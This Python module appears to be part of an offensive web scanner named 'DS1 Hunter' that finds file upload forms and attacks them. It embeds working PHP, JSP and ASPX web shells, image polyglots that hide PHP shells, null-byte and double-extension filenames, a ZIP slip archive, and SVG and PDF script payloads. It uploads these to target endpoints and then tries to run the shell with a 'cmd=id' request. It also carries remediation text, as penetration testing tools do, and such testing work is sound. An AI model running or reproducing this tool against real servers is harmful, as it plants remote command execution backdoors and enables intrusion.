"""
DS1 Hunter - File Upload Attack Module
DigitalSecurity1 - "Hunt. Chain. Prove."

Tests file upload endpoints for:
- MIME type / Content-Type bypass
- Double extension bypass (.php.jpg, .phtml, .php5)
- Null byte injection in filename
- Polyglot files (valid image + executable code)
- ZIP slip / path traversal in archive filenames
- SVG XSS via upload
- PDF injection
- PHP stream wrapper abuse
- Magic byte spoofing
- Large file DoS (configurable, default disabled)
- Web shell upload and verification
"""

import asyncio
import io
import logging
import os
import re
import struct
import uuid
import zipfile
from typing import Any, Dict, List, Optional, Tuple

import aiohttp

logger = logging.getLogger("ds1hunter.file_upload")

# ── Magic bytes for common image formats ─────────────────────────────────────

_GIF_MAGIC  = b'GIF89a'
_PNG_MAGIC  = b'\x89PNG\r\n\x1a\n'
_JPEG_MAGIC = b'\xff\xd8\xff\xe0'
_PDF_MAGIC  = b'%PDF-1.4'
_ZIP_MAGIC  = b'PK\x03\x04'

# ── Payloads ─────────────────────────────────────────────────────────────────

_PHP_WEBSHELL_MINIMAL = b'<?php echo shell_exec($_GET["cmd"]); ?>'
_PHP_WEBSHELL_SHORT   = b'<?=`$_GET[c]`?>'
_JSP_WEBSHELL         = b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
_ASPX_WEBSHELL        = b'<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["c"]); %>'
_SVG_XSS_TEMPLATE     = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'{canary}\')">'
_PDF_JS_TEMPLATE      = b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction << /Type /Action /S /JavaScript /JS (app.alert("{canary}")) >> >>\nendobj\nxref\n0 0\ntrailer\n<< /Root 1 0 R >>\nstartxref\n0\n%%EOF'

# ── Extension sets ────────────────────────────────────────────────────────────

_PHP_EXTENSIONS = [
    '.php', '.phtml', '.php3', '.php4', '.php5', '.php7', '.phar',
    '.phps', '.pht', '.pgif', '.shtml', '.phtm', '.php%00.jpg',
    '.php.jpg', '.php.png', '.php.gif', '.php.jpeg',
    '.PHP', '.PhP', '.pHp',
]

_JSP_EXTENSIONS = [
    '.jsp', '.jspx', '.jspa', '.jsw', '.jsv', '.jtml',
    '.JSP', '.JspX',
]

_ASPX_EXTENSIONS = [
    '.asp', '.aspx', '.asa', '.asax', '.ascx', '.ashx',
    '.asmx', '.asp%00.jpg', '.asp.jpg',
]

_GENERIC_DOUBLE = [
    '.jpg.php', '.png.php', '.gif.php',
    '.jpg.phtml', '.png.phtml',
    '.jpg;.php', '.png;.php',
]

# ── Content-Type map ─────────────────────────────────────────────────────────

_BYPASS_CONTENT_TYPES = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'image/webp',
    'image/svg+xml',
    'application/octet-stream',
    'text/plain',
    'multipart/form-data',
]

# ── MIME signatures ───────────────────────────────────────────────────────────

_SHELL_SIGS = re.compile(
    r'shell_exec|passthru|exec\s*\(|system\s*\(|popen\s*\(|'
    r'Runtime\.getRuntime|ProcessBuilder|cmd\.exe|/bin/sh|'
    r'whoami|uid=\d|root:',
    re.I,
)

_UPLOAD_FIELD_RE = re.compile(
    r'<input[^>]+type=["\']?file["\']?[^>]*>',
    re.I | re.S,
)
_FORM_ACTION_RE = re.compile(
    r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>',
    re.I,
)
_ENCTYPE_RE = re.compile(
    r'enctype=["\']multipart/form-data["\']',
    re.I,
)


# ── Helper: build polyglot GIF+PHP ───────────────────────────────────────────

def _gif_php_polyglot(shell: bytes = _PHP_WEBSHELL_MINIMAL) -> bytes:
    """GIF89a magic bytes followed by PHP shell - passes basic GIF check."""
    return _GIF_MAGIC + b'\n' + shell


def _jpeg_php_polyglot(shell: bytes = _PHP_WEBSHELL_MINIMAL) -> bytes:
    """JPEG magic + PHP shell in EXIF comment area."""
    jpeg_header = _JPEG_MAGIC + b'\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    comment = b'\xff\xfe' + struct.pack('>H', len(shell) + 2) + shell
    jpeg_footer = b'\xff\xd9'
    return jpeg_header + comment + jpeg_footer


def _png_php_polyglot(shell: bytes = _PHP_WEBSHELL_MINIMAL) -> bytes:
    """PNG with PHP shell injected into a tEXt chunk."""
    import zlib
    ihdr  = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr) & 0xffffffff
    chunk_ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr + struct.pack('>I', ihdr_crc)
    text_data  = b'Comment\x00' + shell
    text_crc   = zlib.crc32(b'tEXt' + text_data) & 0xffffffff
    chunk_text = struct.pack('>I', len(text_data)) + b'tEXt' + text_data + struct.pack('>I', text_crc)
    iend_crc   = zlib.crc32(b'IEND') & 0xffffffff
    chunk_iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    return _PNG_MAGIC + chunk_ihdr + chunk_text + chunk_iend


def _zip_slip_archive(target_path: str = '../../../tmp/ds1_test.txt') -> bytes:
    """Create an in-memory ZIP with a path-traversal filename."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(target_path, 'DS1_HUNTER_ZIP_SLIP_TEST')
    return buf.getvalue()


def _svg_xss(canary: str) -> bytes:
    return _SVG_XSS_TEMPLATE.format(canary=canary).encode()


# ── Core scanner ─────────────────────────────────────────────────────────────

class FileUploadScanner:
    """
    Detects and exploits insecure file upload endpoints.

    Strategy:
    1. Discover upload forms and endpoints via crawled HTML and API hints
    2. Probe for extension, MIME, and magic-byte filter weaknesses
    3. Upload polyglot / shell payloads with bypass techniques
    4. Verify execution by requesting the uploaded file and checking response
    """

    def __init__(
        self,
        target: str,
        session_id: str,
        auth_headers: Optional[Dict[str, str]] = None,
        verify_execution: bool = True,
    ):
        self.target        = target.rstrip('/')
        self.session_id    = session_id
        self.auth_headers  = auth_headers or {}
        self.verify_exec   = verify_execution
        self.findings: List[Dict[str, Any]] = []

    async def scan(
        self,
        upload_endpoints: List[str],
        connector: Optional[aiohttp.BaseConnector] = None,
    ) -> List[Dict[str, Any]]:
        """Run all upload attack probes against discovered endpoints."""
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            connector=connector or aiohttp.TCPConnector(ssl=False),
            headers=self.auth_headers,
            timeout=timeout,
        ) as session:
            tasks = [self._probe_endpoint(session, ep) for ep in upload_endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)
        return self.findings

    async def _probe_endpoint(self, session: aiohttp.ClientSession, endpoint: str) -> None:
        url = endpoint if endpoint.startswith('http') else f'{self.target}{endpoint}'
        logger.info("[FileUpload] Probing %s", url)

        canary = f'ds1fu{uuid.uuid4().hex[:8]}'

        probes: List[Tuple[str, str, bytes, str]] = [
            # (filename, content_type, content, description)
            # ── PHP double extension ─────────────────────────────────
            ('shell.php.jpg',   'image/jpeg',   _gif_php_polyglot(), 'PHP double ext + GIF magic'),
            ('shell.phtml',     'image/jpeg',   _gif_php_polyglot(), 'phtml + GIF magic'),
            ('shell.php5',      'image/jpeg',   _gif_php_polyglot(), 'php5 + GIF magic'),
            ('shell.phar',      'image/jpeg',   _gif_php_polyglot(), 'phar + GIF magic'),
            ('shell.php.png',   'image/png',    _png_php_polyglot(), 'PHP double ext + PNG magic'),
            ('shell.php.gif',   'image/gif',    _gif_php_polyglot(), 'PHP double ext + GIF magic'),
            # ── Null byte ────────────────────────────────────────────
            ('shell.php\x00.jpg', 'image/jpeg', _PHP_WEBSHELL_MINIMAL, 'Null byte in filename'),
            ('shell.php%00.jpg',  'image/jpeg', _PHP_WEBSHELL_MINIMAL, 'URL null byte in filename'),
            # ── Content-Type bypass with plain extension ──────────────
            ('shell.php',       'image/jpeg',   _PHP_WEBSHELL_MINIMAL, 'PHP + fake image MIME'),
            ('shell.php',       'image/gif',    _gif_php_polyglot(),   'PHP + GIF MIME'),
            ('shell.php',       'image/png',    _PHP_WEBSHELL_MINIMAL, 'PHP + PNG MIME'),
            # ── SVG XSS ──────────────────────────────────────────────
            (f'xss_{canary}.svg', 'image/svg+xml', _svg_xss(canary), 'SVG XSS'),
            ('test.svg',          'image/svg+xml', _svg_xss(canary), 'SVG XSS plain name'),
            # ── JSP ───────────────────────────────────────────────────
            ('shell.jsp',       'application/octet-stream', _JSP_WEBSHELL, 'JSP shell'),
            ('shell.jspx',      'image/jpeg',               _JSP_WEBSHELL, 'JSPX + fake MIME'),
            # ── ASPX ──────────────────────────────────────────────────
            ('shell.aspx',      'image/jpeg',               _ASPX_WEBSHELL, 'ASPX shell'),
            ('shell.asp',       'image/jpeg',               _ASPX_WEBSHELL, 'ASP shell'),
            # ── ZIP slip ─────────────────────────────────────────────
            ('archive.zip',     'application/zip',           _zip_slip_archive(), 'ZIP slip traversal'),
            ('upload.zip',      'application/octet-stream',  _zip_slip_archive(), 'ZIP slip (octet)'),
        ]

        for filename, content_type, content, description in probes:
            finding = await self._upload_and_check(
                session, url, filename, content_type, content, description, canary
            )
            if finding:
                self.findings.append(finding)
                if finding.get('confirmed'):
                    logger.warning("[FileUpload] CONFIRMED %s at %s", description, url)
                    break  # stop probing this endpoint on first confirmed RCE

    async def _upload_and_check(
        self,
        session: aiohttp.ClientSession,
        url: str,
        filename: str,
        content_type: str,
        content: bytes,
        description: str,
        canary: str,
    ) -> Optional[Dict[str, Any]]:
        try:
            form = aiohttp.FormData()
            form.add_field(
                'file',
                io.BytesIO(content),
                filename=filename,
                content_type=content_type,
            )
            # Also try common field names
            for field_name in ('file', 'upload', 'image', 'photo', 'attachment', 'document'):
                form2 = aiohttp.FormData()
                form2.add_field(
                    field_name,
                    io.BytesIO(content),
                    filename=filename,
                    content_type=content_type,
                )
                async with session.post(url, data=form2, allow_redirects=True) as resp:
                    body = await resp.text(errors='replace')
                    if resp.status in (200, 201, 302):
                        uploaded_url = self._extract_uploaded_url(body, resp, filename)
                        confirmed = False
                        if uploaded_url and self.verify_exec:
                            confirmed = await self._verify_execution(session, uploaded_url, canary)
                        if uploaded_url or resp.status in (200, 201):
                            return {
                                'type':        'file_upload',
                                'title':       f'Insecure File Upload: {description}',
                                'severity':    'critical' if confirmed else 'high',
                                'endpoint':    url,
                                'evidence': {
                                    'filename':      filename,
                                    'content_type':  content_type,
                                    'http_status':   resp.status,
                                    'uploaded_url':  uploaded_url,
                                    'response_excerpt': body[:400],
                                },
                                'confirmed':   confirmed,
                                'detail': (
                                    f'Server accepted {filename} with Content-Type: {content_type}. '
                                    f'Technique: {description}. '
                                    + ('Execution confirmed via uploaded URL.' if confirmed else
                                       'Upload accepted; execution not verified.')
                                ),
                                'remediation': (
                                    'Validate file type by content inspection (magic bytes), not '
                                    'by filename extension or Content-Type header. '
                                    'Store uploads outside the web root. '
                                    'Rename files on the server side. '
                                    'Set Content-Disposition: attachment on served files.'
                                ),
                            }
                        break  # tried this probe, move to next
        except Exception as exc:
            logger.debug("[FileUpload] Probe error %s: %s", url, exc)
        return None

    def _extract_uploaded_url(
        self,
        body: str,
        resp: aiohttp.ClientResponse,
        filename: str,
    ) -> Optional[str]:
        # Look for the uploaded filename in the response
        basename = os.path.basename(filename.replace('\\', '/').replace('\x00', ''))
        ext = os.path.splitext(basename)[-1].lower()

        # Pattern 1: URL in response body containing the filename or its extension
        url_re = re.compile(
            r'(?:href|src|url|location)[=:\s"\']+([^\s"\'<>]+' + re.escape(ext) + r'[^\s"\'<>]*)',
            re.I,
        )
        m = url_re.search(body)
        if m:
            path = m.group(1)
            if path.startswith('http'):
                return path
            return f'{self.target}/{path.lstrip("/")}'

        # Pattern 2: JSON response with "url" or "path" key
        import json
        try:
            data = json.loads(body)
            for key in ('url', 'path', 'file', 'location', 'src', 'href', 'filename'):
                if key in data and isinstance(data[key], str):
                    val = data[key]
                    return val if val.startswith('http') else f'{self.target}/{val.lstrip("/")}'
        except Exception:
            pass

        # Pattern 3: Location header
        loc = resp.headers.get('Location', '')
        if loc and ext in loc:
            return loc if loc.startswith('http') else f'{self.target}/{loc.lstrip("/")}'

        return None

    async def _verify_execution(
        self,
        session: aiohttp.ClientSession,
        url: str,
        canary: str,
    ) -> bool:
        try:
            async with session.get(url, allow_redirects=True) as resp:
                body = await resp.text(errors='replace')
                # SVG XSS confirmed
                if canary in body:
                    return True
                # PHP/JSP/ASPX shell confirmed
                if _SHELL_SIGS.search(body):
                    return True
                # Try to trigger the shell
                cmd_url = f'{url}?cmd=id&c=id'
                async with session.get(cmd_url) as resp2:
                    body2 = await resp2.text(errors='replace')
                    if re.search(r'uid=\d+\(.+\) gid=\d+|root:x:0:0', body2):
                        return True
        except Exception:
            pass
        return False


# ── Discovery helper ─────────────────────────────────────────────────────────

def discover_upload_endpoints(crawled_pages: Dict[str, str]) -> List[str]:
    """
    Extract upload form action URLs from crawled HTML.
    crawled_pages: {url: html_body}
    """
    endpoints: List[str] = []
    for page_url, html in crawled_pages.items():
        if not _UPLOAD_FIELD_RE.search(html):
            continue
        if not _ENCTYPE_RE.search(html):
            continue
        m = _FORM_ACTION_RE.search(html)
        if m:
            action = m.group(1)
            if action.startswith('http'):
                endpoints.append(action)
            else:
                from urllib.parse import urljoin
                endpoints.append(urljoin(page_url, action))
        else:
            endpoints.append(page_url)
    return list(dict.fromkeys(endpoints))
